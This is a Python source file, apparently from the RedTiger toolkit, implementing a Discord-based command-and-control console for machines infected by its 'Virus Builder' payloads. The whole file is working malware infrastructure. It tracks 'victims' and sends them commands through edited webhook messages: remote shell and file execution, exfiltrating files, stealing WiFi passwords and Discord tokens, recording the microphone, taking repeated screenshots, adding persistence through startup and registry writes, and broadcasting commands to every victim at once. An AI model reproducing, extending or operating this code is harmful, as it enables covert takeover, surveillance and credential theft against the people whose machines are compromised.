# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

try:
    import requests
    import json
    import os
    import sys
    import time
    import threading
except Exception as e:
    ErrorModule(e)

Title("Discord C2 Controller")

# ── Victims DB ────────────────────────────────────────────────────────────────
_DB_PATH       = os.path.join(tool_path, "build", "c2_victims.json")
_REGISTRY_PATH = os.path.join(tool_path, "build", "c2_registry.json")

def _load_db():
    if os.path.isfile(_DB_PATH):
        try:
            with open(_DB_PATH, 'r') as f:
                return json.load(f)
        except: pass
    return {}

def _save_db(db):
    os.makedirs(os.path.dirname(_DB_PATH), exist_ok=True)
    with open(_DB_PATH, 'w') as f:
        json.dump(db, f, indent=2)

def _load_registry_cfg():
    """Load {webhook_url, msg_id} of the global registry message."""
    if os.path.isfile(_REGISTRY_PATH):
        try:
            with open(_REGISTRY_PATH, 'r') as f:
                return json.load(f)
        except: pass
    return {}

def _save_registry_cfg(cfg):
    os.makedirs(os.path.dirname(_REGISTRY_PATH), exist_ok=True)
    with open(_REGISTRY_PATH, 'w') as f:
        json.dump(cfg, f, indent=2)

# ── Discord helpers ───────────────────────────────────────────────────────────
_sess = requests.Session()
_sess.headers.update({"Content-Type": "application/json", "User-Agent": f"{name_tool}/{version_tool}"})

def _get_msg(wh_url, msg_id):
    for _ in range(5):
        try:
            r = _sess.get(f"{wh_url}/messages/{msg_id}", timeout=6)
            if r.status_code == 429:
                time.sleep(r.json().get('retry_after', 5))
                continue
            if r.status_code == 200:
                return r.json()
            return None
        except Exception:
            return None
    return None

def _patch_msg(wh_url, msg_id, description):
    """Returns (True, 200) on success, (False, status_code) on failure."""
    for _ in range(3):
        try:
            r = _sess.patch(
                f"{wh_url}/messages/{msg_id}",
                json={"embeds": [{"title": "[C2 CMD]", "description": description, "color": 16711680}]},
                timeout=6
            )
            if r.status_code == 429:
                time.sleep(r.json().get('retry_after', 5))
                continue
            return r.status_code in (200, 204), r.status_code
        except Exception as e:
            return False, str(e)
    return False, "max retries"

def _check_wh(wh_url):
    try:
        r = _sess.get(wh_url, timeout=5)
        return r.status_code == 200
    except: return False

def _read_current_desc(wh_url, msg_id):
    """Return current embed description of the C2 message, or None."""
    msg = _get_msg(wh_url, msg_id)
    if not msg or not isinstance(msg, dict):
        return None
    embeds = msg.get("embeds", [])
    if embeds:
        return embeds[0].get("description", "")
    return None

# ── Status cache (avoid N requests per menu render) ───────────────────────────
_status_cache: dict = {}   # name -> (status_str, timestamp)
_STATUS_TTL = 15           # seconds

def _victim_status_cached(name, wh_url, msg_id):
    now = time.time()
    if name in _status_cache:
        status, ts = _status_cache[name]
        if now - ts < _STATUS_TTL:
            return status
    status = _victim_status_live(wh_url, msg_id)
    _status_cache[name] = (status, now)
    return status

def _victim_status_live(wh_url, msg_id):
    msg = _get_msg(wh_url, msg_id)
    if not msg:
        return f"{red}OFFLINE{white}"
    embeds = msg.get("embeds", [])
    if embeds:
        desc = embeds[0].get("description", "")
        # Extract timestamp embedded by new payloads: "`host` | READY | HH:MM:SS"
        ts = ""
        if " | " in desc:
            parts = desc.split(" | ")
            # last part may be time
            last = parts[-1].strip()
            if len(last) == 8 and last[2] == ":" and last[5] == ":":
                try:
                    import datetime
                    now   = datetime.datetime.now()
                    then  = datetime.datetime.strptime(last, "%H:%M:%S").replace(
                                year=now.year, month=now.month, day=now.day)
                    delta = int((now - then).total_seconds())
                    if delta < 0: delta = 0
                    ts = f" {white}[{yellow}{delta}s ago{white}]"
                except: pass
        if "READY" in desc:
            return f"{green}ONLINE / READY{white}{ts}"
        if "RUNNING" in desc:
            return f"{yellow}ONLINE / RUNNING{white}{ts}"
    return f"{yellow}ONLINE{white}"

def _invalidate_cache(name):
    _status_cache.pop(name, None)

# ── Display helpers ───────────────────────────────────────────────────────────
def _header():
    Clear()
    Title("Discord C2 Controller")
    print(f"""
{red}╔══════════════════════════════════════════════════════════════╗
{red}║  {white}Discord C2 Controller{red}  ·  {white}{name_tool} {version_tool}{red}                          ║
{red}╚══════════════════════════════════════════════════════════════╝{white}
""")

# ── Commands menu ─────────────────────────────────────────────────────────────
# ── Command categories ────────────────────────────────────────────────────────
_CMD_CATS = {
    "System": {
        "1":  ("Shell command",          "CMD::shell::",    "CMD::shell::<command>"),
        "2":  ("Run file/app",           "CMD::run::",      "CMD::run::<path_or_command>"),
        "3":  ("Screenshot",             "CMD::screenshot", None),
        "4":  ("Upload file → Discord",  "CMD::upload::",   "CMD::upload::<victim_path>"),
        "5":  ("Download → victim",      "CMD::download::", "CMD::download::<url>::<dest_path>"),
        "6":  ("Update build",           "CMD::update::",   "CMD::update::<url_to_new_exe>"),
        "7":  ("Rollback",               "CMD::rollback",   None),
        "8":  ("Kill (exit process)",    "CMD::exit",       None),
    },
    "Files": {
        "9":  ("List directory",         "CMD::ls",         "CMD::ls[::<path>]"),
        "10": ("Read file",              "CMD::cat::",      "CMD::cat::<path>"),
        "11": ("Write file",             "CMD::write::",    "CMD::write::<path>::<content>"),
        "12": ("Delete file",            "CMD::del::",      "CMD::del::<path>"),
        "13": ("Rename / move",          "CMD::rename::",   "CMD::rename::<src>::<dst>"),
        "14": ("Create directory",       "CMD::mkdir::",    "CMD::mkdir::<path>"),
        "15": ("Search (glob)",          "CMD::search::",   "CMD::search::<pattern>"),
        "16": ("Current dir (pwd)",      "CMD::pwd",        None),
        "17": ("Change dir",             "CMD::cd::",       "CMD::cd::<path>"),
    },
    "Info": {
        "18": ("System info",            "CMD::sysinfo",    None),
        "19": ("Process list",           "CMD::ps",         None),
        "20": ("Kill process",           "CMD::kill::",     "CMD::kill::<name_or_pid>"),
        "21": ("Drives",                 "CMD::drives",     None),
        "22": ("Screen resolution",      "CMD::resolution", None),
        "23": ("Uptime",                 "CMD::uptime",     None),
        "24": ("IP geolocation",         "CMD::location",   None),
        "25": ("Who am I / privs",       "CMD::whoami",     None),
        "26": ("Network connections",    "CMD::netstat",    None),
        "27": ("ARP table",              "CMD::arp",        None),
    },
    "Interact": {
        "28": ("Get clipboard",          "CMD::clip",       None),
        "29": ("Set clipboard",          "CMD::clip_set::", "CMD::clip_set::<text>"),
        "30": ("Show message box",       "CMD::msgbox::",   "CMD::msgbox::<title>::<message>"),
        "31": ("Open URL in browser",    "CMD::url::",      "CMD::url::<url>"),
        "32": ("Set volume (0-100%)",    "CMD::volume::",   "CMD::volume::<0-100>"),
        "33": ("Lock screen",            "CMD::lock",       None),
        "34": ("Shutdown/reboot/logoff", "CMD::shutdown::", "CMD::shutdown::<reboot|off|logoff>"),
    },
    "Harvest": {
        "35": ("Env variables",          "CMD::env",        None),
        "36": ("WiFi passwords",         "CMD::wifi",       None),
        "37": ("Discord tokens",         "CMD::tokens",     None),
        "38": ("Installed software",     "CMD::installed",  None),
        "39": ("Startup programs",       "CMD::startup",    None),
        "40": ("Record mic (N sec)",     "CMD::mic::",      "CMD::mic::<seconds>"),
    },
    "Persist/Reg": {
        "41": ("Add to startup",         "CMD::persist",    None),
        "42": ("Remove from startup",    "CMD::unpersist",  None),
        "43": ("Registry read",          "CMD::reg_read::", "CMD::reg_read::<HKCU|HKLM>::<key>::<value_name>"),
        "44": ("Registry write",         "CMD::reg_write::","CMD::reg_write::<HKCU|HKLM>::<key>::<name>::<value>"),
    },
}

# Flat map for lookup
_COMMANDS: dict = {}
for _cat_cmds in _CMD_CATS.values():
    _COMMANDS.update(_cat_cmds)

# No-arg commands (send prefix directly)
_NO_ARG = {"3","7","8","16","18","19","21","22","23","24","25","26","27",
            "28","33","35","36","37","38","39","41","42"}

def _send_command(victim_name, victim):
    wh  = victim["webhook"]
    mid = victim["msg_id"]

    while True:
        _header()
        print(f"  {red}Target : {white}{victim_name}  |  {_victim_status_live(wh, mid)}\n")

        for cat_name, cat_cmds in _CMD_CATS.items():
            print(f"  {red}┌── {white}{cat_name}{red} ─────────────────────────────────────────────────┐{white}")
            for k, (label, _, example) in cat_cmds.items():
                ex_str = f"  {yellow}{example}{white}" if example else ""
                print(f"  {red}│ [{white}{k:>2}{red}]{white} {label:<28}{ex_str}")
            print(f"  {red}└───────────────────────────────────────────────────────────┘{white}")

        print(f"\n  {red}[{white}0{red}]{white} Back\n")

        choice = input(MainColor(f" ┌──({white}{username_pc}@c2)─{red}[{white}~/{victim_name}]\n └─{white}$ {reset}")).strip()

        if choice == "0":
            _invalidate_cache(victim_name)
            break

        if choice not in _COMMANDS:
            continue

        label, prefix, example = _COMMANDS[choice]

        # Build command string
        cmd = None
        if choice in _NO_ARG:
            cmd = prefix
        elif choice == "1":
            arg = input(f"  {INPUT} Shell command: ").strip()
            if not arg: continue
            cmd = prefix + arg
        elif choice == "2":
            arg = input(f"  {INPUT} Path / command to run: ").strip()
            if not arg: continue
            cmd = prefix + arg
        elif choice == "4":
            arg = input(f"  {INPUT} Victim file path: ").strip()
            if not arg: continue
            cmd = prefix + arg
        elif choice == "5":
            url  = input(f"  {INPUT} URL to download: ").strip()
            dest = input(f"  {INPUT} Destination path on victim (blank = TEMP): ").strip()
            if not url: continue
            cmd = prefix + url + (f"::{dest}" if dest else "")
        elif choice == "6":
            url = input(f"  {INPUT} URL of new build: ").strip()
            if not url: continue
            cmd = prefix + url
        elif choice in ("9", "17"):
            arg = input(f"  {INPUT} Path (blank = current dir): ").strip()
            cmd = prefix + (f"::{arg}" if arg and choice == "9" else arg)
        elif choice in ("10", "12", "14", "20", "31", "32", "40"):
            arg = input(f"  {INPUT} {label}: ").strip()
            if not arg: continue
            cmd = prefix + arg
        elif choice == "11":
            p = input(f"  {INPUT} File path: ").strip()
            c = input(f"  {INPUT} Content: ").strip()
            if not p: continue
            cmd = prefix + p + "::" + c
        elif choice == "13":
            src = input(f"  {INPUT} Source path: ").strip()
            dst = input(f"  {INPUT} Destination path: ").strip()
            if not src or not dst: continue
            cmd = prefix + src + "::" + dst
        elif choice == "15":
            arg = input(f"  {INPUT} Glob pattern (e.g. C:\\Users\\**\\*.txt): ").strip()
            if not arg: continue
            cmd = prefix + arg
        elif choice == "29":
            arg = input(f"  {INPUT} Text to set in clipboard: ").strip()
            cmd = prefix + arg
        elif choice == "30":
            title = input(f"  {INPUT} Title: ").strip()
            msg   = input(f"  {INPUT} Message: ").strip()
            if not msg: continue
            cmd = prefix + (title or "Info") + "::" + msg
        elif choice == "34":
            mode = input(f"  {INPUT} Mode [reboot/off/logoff]: ").strip().lower()
            if mode not in ("reboot", "off", "logoff"): continue
            cmd = prefix + mode
        elif choice == "43":
            hive = input(f"  {INPUT} Hive [HKCU/HKLM]: ").strip().upper()
            key  = input(f"  {INPUT} Key path: ").strip()
            val  = input(f"  {INPUT} Value name (blank = default): ").strip()
            if not hive or not key: continue
            cmd = prefix + hive + "::" + key + "::" + val
        elif choice == "44":
            hive = input(f"  {INPUT} Hive [HKCU/HKLM]: ").strip().upper()
            key  = input(f"  {INPUT} Key path: ").strip()
            name = input(f"  {INPUT} Value name: ").strip()
            data = input(f"  {INPUT} Value data: ").strip()
            if not hive or not key or not name: continue
            cmd = prefix + hive + "::" + key + "::" + name + "::" + data
        else:
            arg = input(f"  {INPUT} Argument: ").strip()
            if not arg: continue
            cmd = prefix + arg

        if cmd is None:
            continue

        print(f"\n  {WAIT} Sending command: {white}{cmd[:100]}")

        # ── Step 1: read current state before sending ─────────────────────────
        before = _read_current_desc(wh, mid)
        if before is None:
            print(f"  {ERROR} Cannot read message from Discord.")
            print(f"  {yellow}  → HTTP GET {wh}/messages/{mid} failed.")
            print(f"  {yellow}  → Possible causes: wrong MSG_ID, message deleted, webhook revoked.")
            print(f"  {yellow}  → Use [U] to update the MSG_ID or [A] to re-add the victim.{white}")
            input(f"\n  {INFO} Press Enter to continue...")
            continue

        if before.startswith("CMD::"):
            print(f"  {yellow}  ⚠ Previous command still pending: {white}{before[:60]}")
            print(f"  {yellow}  Victim may be offline or processing. Sending anyway...{white}")
        elif "READY" not in before and "RUNNING" not in before:
            print(f"  {yellow}  ⚠ Message state unexpected: {white}{before[:80]}")
            print(f"  {yellow}  This may indicate a MSG_ID mismatch. Current content shown above.{white}")

        # ── Step 2: patch the message ─────────────────────────────────────────
        _invalidate_cache(victim_name)
        ok, http_code = _patch_msg(wh, mid, cmd)

        if not ok:
            print(f"  {ERROR} PATCH failed — HTTP {http_code}")
            if str(http_code) == "404":
                print(f"  {yellow}  → Message not found. The victim probably registered a new MSG_ID.")
                print(f"  {yellow}  → Use [U] to update, or check Discord for a new [C2-REGISTER] message.{white}")
            elif str(http_code) == "403":
                print(f"  {yellow}  → Forbidden. Webhook token may be invalid or revoked.{white}")
            input(f"\n  {INFO} Press Enter to continue...")
            continue

        print(f"  {ADD} PATCH OK (HTTP {http_code}) — message updated in Discord.")

        # ── Step 3: re-read after 3s to confirm victim picked it up ──────────
        print(f"  {WAIT} Verifying delivery (waiting 3s)...")
        time.sleep(3)
        after = _read_current_desc(wh, mid)
        if after is None:
            print(f"  {yellow}  ⚠ Cannot re-read message after PATCH (Discord API issue).{white}")
        elif after.strip() == cmd.strip():
            print(f"  {yellow}  ⚠ Message still shows the command — victim has NOT picked it up yet.{white}")
            print(f"  {yellow}    The victim is either offline, using a different MSG_ID,")
            print(f"  {yellow}    or its poll interval hasn't fired yet (polls every 4s).{white}")
        elif "RUNNING" in after:
            print(f"  {ADD} Victim confirmed: already executing!")
        elif "READY" in after:
            print(f"  {ADD} Victim confirmed: already done and back to READY.")
        else:
            print(f"  {yellow}  Message changed to: {white}{after[:80]}{white}")

        print(f"  {WAIT} Waiting for READY (max 60s)...")
        _poll_ready_async(wh, mid, timeout=60)
        input(f"\n  {INFO} Press Enter to continue...")

def _poll_ready_async(wh, mid, timeout=60):
    result = [None]
    done   = threading.Event()

    def _worker():
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(2)
            msg = _get_msg(wh, mid)
            if msg:
                embeds = msg.get("embeds", [])
                if embeds and "READY" in embeds[0].get("description", ""):
                    result[0] = "ready"
                    done.set()
                    return
        done.set()

    threading.Thread(target=_worker, daemon=True).start()
    done.wait(timeout=timeout + 2)

    if result[0] == "ready":
        print(f"  {GEN_VALID} Command executed. Result posted in Discord.")
    else:
        print(f"  {NOTE} Timed out — check Discord for results.")

# ── Broadcast (mass command on all victims) ───────────────────────────────────
def _broadcast(db):
    _header()
    if not db:
        print(f"  {INFO} No victims in database.")
        time.sleep(1.5)
        return

    print(f"  {red}┌── Mass Command (all {len(db)} victims) ────────────────────────────┐{white}")
    print(f"  {red}│  {white}This will send the same command to every online victim.")
    print(f"  {red}│  {white}Results will appear individually in Discord.")
    print(f"  {red}└───────────────────────────────────────────────────────────┘{white}\n")
    print(f"  {yellow}Examples: CMD::screenshot  |  CMD::sysinfo  |  CMD::wifi  |  CMD::tokens{white}\n")

    cmd = input(f"  {INPUT} Command to broadcast (blank=cancel): ").strip()
    if not cmd:
        return

    sent = 0
    failed = 0
    for name, v in db.items():
        ok, code = _patch_msg(v["webhook"], v["msg_id"], cmd)
        if ok:
            print(f"  {ADD} Sent → {name}  (HTTP {code})")
            _invalidate_cache(name)
            sent += 1
        else:
            print(f"  {ERROR} Failed → {name}  (HTTP {code})")
            failed += 1

    print(f"\n  {INFO} Broadcast done: {sent} sent, {failed} failed.")
    input(f"\n  {INFO} Press Enter to continue...")

# ── Real-time screen view (auto-screenshot loop) ──────────────────────────────
def _screen_view(db):
    _header()
    if not db:
        print(f"  {INFO} No victims in database.")
        time.sleep(1.5)
        return

    names = list(db.keys())
    for i, n in enumerate(names, 1):
        v = db[n]
        status = _victim_status_cached(n, v["webhook"], v["msg_id"])
        print(f"  {red}[{white}{i:02d}{red}]{white} {n:<28} {status}")
    choice = input(f"\n  {INPUT} Select victim number (0=cancel): ").strip()
    if choice == "0": return
    try:
        idx  = int(choice) - 1
        name = names[idx]
        v    = db[name]
    except:
        return

    interval = input(f"  {INPUT} Screenshot interval in seconds (default 10): ").strip()
    try:    interval = max(5, int(interval))
    except: interval = 10

    print(f"\n  {INFO} Screen view started for '{name}' — every {interval}s. Press Ctrl+C to stop.\n")
    try:
        while True:
            ok, code = _patch_msg(v["webhook"], v["msg_id"], "CMD::screenshot")
            if ok:
                print(f"  {ADD} Screenshot requested (HTTP {code}). Waiting {interval}s...")
                _invalidate_cache(name)
                _poll_ready_async(v["webhook"], v["msg_id"], timeout=interval + 10)
            else:
                print(f"  {ERROR} PATCH failed (HTTP {code}) — victim offline or wrong MSG_ID.")
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n  {INFO} Screen view stopped.")

# ── Auto-registry helpers ─────────────────────────────────────────────────────
def _registry_get_victims(wh_url, reg_mid):
    """Read the registry message and parse the victim map {name: msg_id}."""
    msg = _get_msg(wh_url, reg_mid)
    if not msg or not isinstance(msg, dict):
        return None
    embeds = msg.get("embeds", [])
    if not embeds:
        return {}
    desc = embeds[0].get("description", "")
    try:
        # Content is JSON stored in a code block: ```json\n{...}\n```
        inner = desc.strip().strip("`").strip()
        if inner.startswith("json"):
            inner = inner[4:].strip()
        return json.loads(inner)
    except:
        return {}

def _registry_set_victims(wh_url, reg_mid, victims_map):
    """Write the updated victim map back to the registry message."""
    tck  = chr(96) * 3
    body = tck + "json\n" + json.dumps(victims_map, indent=2) + "\n" + tck
    ok, code = _patch_msg(wh_url, reg_mid,
                          f"**C2 Auto-Registry** — {len(victims_map)} victim(s)\n{body}")
    return ok, code

def _setup_registry(db):
    """Create the global registry message once. Saves config to c2_registry.json."""
    _header()
    reg = _load_registry_cfg()
    if reg.get("msg_id"):
        print(f"  {INFO} Registry already set up.")
        print(f"  {white}Webhook : {reg['webhook_url'][:60]}")
        print(f"  {white}MSG ID  : {reg['msg_id']}")
        print(f"\n  {yellow}Copy this MSG_ID into Virus Builder → C2 → Registry MSG ID{white}\n")
        choice = input(f"  {INPUT} Re-create registry? (y/N): ").strip().lower()
        if choice != "y":
            time.sleep(1)
            return

    wh_url = input(f"  {INPUT} Webhook URL (same one used in builds): ").strip()
    if not wh_url:
        return

    print(f"  {WAIT} Creating registry message...")
    tck  = chr(96) * 3
    body = tck + "json\n{}\n" + tck
    try:
        r = _sess.post(
            wh_url + "?wait=true",
            json={"embeds": [{"title": "C2 Auto-Registry",
                               "description": f"**C2 Auto-Registry** — 0 victim(s)\n{body}",
                               "color": 11206149}],
                  "username": "RedTiger C2"},
            timeout=8
        )
        if r.status_code != 200:
            print(f"  {ERROR} Failed to create registry message (HTTP {r.status_code})")
            time.sleep(2)
            return
        reg_mid = r.json().get("id")
    except Exception as e:
        print(f"  {ERROR} {e}")
        time.sleep(2)
        return

    cfg = {"webhook_url": wh_url, "msg_id": reg_mid}
    _save_registry_cfg(cfg)

    print(f"\n  {ADD} Registry created!")
    print(f"  {white}MSG ID  : {reg_mid}")
    print(f"\n  {yellow}╔══════════════════════════════════════════════════════════╗")
    print(f"  {yellow}║ Copy this MSG_ID into Virus Builder:                     ║")
    print(f"  {yellow}║ Config tab → C2 Registry MSG ID → paste {str(reg_mid)[:20]:<20}  ║")
    print(f"  {yellow}╚══════════════════════════════════════════════════════════╝{white}\n")
    input(f"  {INFO} Press Enter to continue...")

def _watch_registry(db):
    """Read the registry message and auto-import any new victims."""
    _header()
    reg = _load_registry_cfg()
    if not reg.get("msg_id") or not reg.get("webhook_url"):
        print(f"  {ERROR} Registry not set up yet. Use [S] Setup Registry first.")
        time.sleep(2)
        return

    wh_url = reg["webhook_url"]
    reg_mid = reg["msg_id"]

    print(f"  {WAIT} Reading registry message (MSG_ID: {reg_mid})...")
    victims_map = _registry_get_victims(wh_url, reg_mid)

    if victims_map is None:
        print(f"  {ERROR} Cannot read registry message from Discord.")
        print(f"  {yellow}  → Check that the webhook URL and MSG_ID are still valid.{white}")
        time.sleep(2)
        return

    if not victims_map:
        print(f"  {INFO} Registry is empty — no victims have registered yet.")
        print(f"  {INFO} Build a payload with the registry MSG_ID embedded and run it.")
        time.sleep(2)
        return

    new_count = 0
    updated   = 0
    for name, entry in victims_map.items():
        msg_id   = entry.get("msg_id", "")
        wh       = entry.get("webhook", wh_url)
        added_at = entry.get("time", current_time_day_hour())

        if name not in db:
            db[name] = {"webhook": wh, "msg_id": msg_id, "added": added_at}
            print(f"  {ADD} New victim imported: {white}{name}  (MSG_ID: {msg_id})")
            new_count += 1
        elif db[name].get("msg_id") != msg_id:
            db[name]["msg_id"] = msg_id
            print(f"  {ADD} Updated MSG_ID for: {white}{name}  (new: {msg_id})")
            updated += 1
        else:
            print(f"  {INFO} Already known: {white}{name}")

    if new_count or updated:
        _save_db(db)

    print(f"\n  {INFO} Done: {new_count} new, {updated} updated.")
    input(f"\n  {INFO} Press Enter to continue...")

# ── Victim management ─────────────────────────────────────────────────────────
def _add_victim(db):
    _header()
    print(f"  {INFO} A victim that has C2 Heartbeat enabled will post a message like:\n")
    print(f"  {white}[C2-REGISTER] `HOSTNAME` | MSG_ID: 1234567890123456789\n")
    print(f"  {INFO} Copy the MSG_ID and webhook URL from Discord.\n")

    name    = input(f"  {INPUT} Victim label (e.g. hostname): ").strip()
    wh_url  = input(f"  {INPUT} Webhook URL: ").strip()
    msg_id  = input(f"  {INPUT} MSG_ID (from Discord): ").strip()

    if not name or not wh_url or not msg_id:
        print(f"  {ERROR} Missing fields.")
        time.sleep(1.5)
        return

    print(f"  {WAIT} Validating webhook...")
    if not _check_wh(wh_url):
        print(f"  {ERROR} Invalid webhook URL — victim not added.")
        time.sleep(2)
        return

    db[name] = {"webhook": wh_url, "msg_id": msg_id, "added": current_time_day_hour()}
    _save_db(db)
    print(f"  {ADD} Victim '{name}' added.")
    time.sleep(1.5)

def _update_msgid(db):
    _header()
    if not db:
        print(f"  {INFO} No victims in database.")
        time.sleep(1.5)
        return

    names = list(db.keys())
    for i, n in enumerate(names, 1):
        v = db[n]
        status = _victim_status_cached(n, v["webhook"], v["msg_id"])
        print(f"  {red}[{white}{i}{red}]{white} {n:<28} {status}")
    choice = input(f"\n  {INPUT} Number to update MSG_ID (0=cancel): ").strip()
    if choice == "0": return
    try:
        idx  = int(choice) - 1
        name = names[idx]
    except:
        return
    new_mid = input(f"  {INPUT} New MSG_ID for '{name}' (from Discord): ").strip()
    if not new_mid:
        return
    db[name]["msg_id"] = new_mid
    _invalidate_cache(name)
    _save_db(db)
    print(f"  {ADD} MSG_ID updated for '{name}'.")
    time.sleep(1.5)

def _remove_victim(db):
    _header()
    if not db:
        print(f"  {INFO} No victims in database.")
        time.sleep(1.5)
        return

    names = list(db.keys())
    for i, n in enumerate(names, 1):
        print(f"  {red}[{white}{i}{red}]{white} {n}")
    choice = input(f"\n  {INPUT} Number to remove (0=cancel): ").strip()
    if choice == "0": return
    try:
        idx = int(choice) - 1
        name = names[idx]
        del db[name]
        _invalidate_cache(name)
        _save_db(db)
        print(f"  {ADD} Removed '{name}'.")
    except: pass
    time.sleep(1.5)

# ── Background status refresher ───────────────────────────────────────────────
_monitor_stop = threading.Event()

def _monitor_loop():
    while not _monitor_stop.is_set():
        time.sleep(20)
        try:
            db = _load_db()
            for name, v in db.items():
                status = _victim_status_live(v["webhook"], v["msg_id"])
                _status_cache[name] = (status, time.time())
        except: pass

# ── Main loop ─────────────────────────────────────────────────────────────────
Slow(f"""
{red}  ██████╗██████╗
{red} ██╔════╝╚════██╗  {white}Discord C2 Controller
{red} ██║      █████╔╝  {white}Manage your victims · Send commands
{red} ██║     ██╔═══╝   {red}{name_tool} {version_tool}
{red} ╚██████╗███████╗
{red}  ╚═════╝╚══════╝{white}
""")

db = _load_db()
monitor_t = threading.Thread(target=_monitor_loop, daemon=True)
monitor_t.start()

while True:
    try:
        _header()
        db = _load_db()

        print(f"  {red}┌── Victims ({len(db)}) ─────────────────────────────────────────────┐{white}")
        if not db:
            print(f"  {red}│  {white}No victims registered yet.{red}                                   │")
        else:
            names = list(db.keys())
            for i, name in enumerate(names, 1):
                v      = db[name]
                status = _victim_status_cached(name, v["webhook"], v["msg_id"])
                print(f"  {red}│  {red}[{white}{i:02d}{red}]{white} {name:<28} {status}")
        print(f"  {red}└───────────────────────────────────────────────────────────┘{white}")

        print(f"""
  {red}[{white}A{red}]{white} Add victim       {red}[{white}R{red}]{white} Remove victim    {red}[{white}U{red}]{white} Update MSG_ID
  {red}[{white}M{red}]{white} Mass broadcast    {red}[{white}V{red}]{white} Screen view      {red}[{white}0{red}]{white} Exit
  {red}[{white}S{red}]{white} Setup registry    {red}[{white}W{red}]{white} {green}Auto-import victims{red} (read registry)
  {red}[{white}1-N{red}]{white} Select victim
  {yellow}Tip: use [S] once to create the registry, then [W] to auto-import victims.{white}
""")

        choice = input(MainColor(f" ┌──({white}{username_pc}@c2-controller)─{red}[{white}~/C2]\n └─{white}$ {reset}")).strip().lower()

        if choice == "0":
            _monitor_stop.set()
            print(f"\n  {INFO} Closing C2 Controller.")
            break

        elif choice == "a":
            _add_victim(db)

        elif choice == "r":
            _remove_victim(db)

        elif choice == "u":
            _update_msgid(db)

        elif choice == "m":
            _broadcast(db)

        elif choice == "v":
            _screen_view(db)

        elif choice == "s":
            _setup_registry(db)

        elif choice == "w":
            _watch_registry(db)

        elif choice.isdigit():
            idx = int(choice) - 1
            names = list(db.keys())
            if 0 <= idx < len(names):
                _send_command(names[idx], db[names[idx]])

    except KeyboardInterrupt:
        _monitor_stop.set()
        print(f"\n  {INFO} Exiting.")
        break
    except Exception as e:
        Error(e)

Continue()
